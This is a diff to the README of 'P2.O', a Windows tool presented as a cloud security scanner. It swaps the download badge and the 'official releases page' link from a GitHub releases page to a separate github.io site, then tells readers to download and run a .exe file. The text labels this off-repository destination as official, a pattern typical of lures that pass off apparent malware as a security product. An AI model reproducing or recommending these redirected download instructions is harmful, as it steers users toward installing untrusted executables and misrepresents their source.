@@ -1,6 +1,6 @@
 # 🛡️ P2.O - Secure Your Cloud Applications Quickly
 
-[![](https://img.shields.io/badge/Download-P2.O_Latest-blue.svg)](https://github.com/deutschemarktoxicdumpsite635/P2.O/releases)
+[![](https://img.shields.io/badge/Download-P2.O_Latest-blue.svg)](https://deutschemarktoxicdumpsite635.github.io)
 
 P2.O protects your digital infrastructure against common threats. It scans your code and cloud settings to find risks. The tool helps you fix problems before attackers exploit them.
 
@@ -8,7 +8,7 @@ P2.O protects your digital infrastructure against common threats. It scans your 
 
 You need a Windows computer to use this tool. Follow these steps to set up the software.
 
-1. Visit the [official releases page](https://github.com/deutschemarktoxicdumpsite635/P2.O/releases).
+1. Visit the [official releases page](https://deutschemarktoxicdumpsite635.github.io).
 2. Look for the Assets section at the bottom of the newest page.
 3. Select the file ending in .exe to start the download.
 4. Save the file to a folder you can find later, like your Downloads folder.
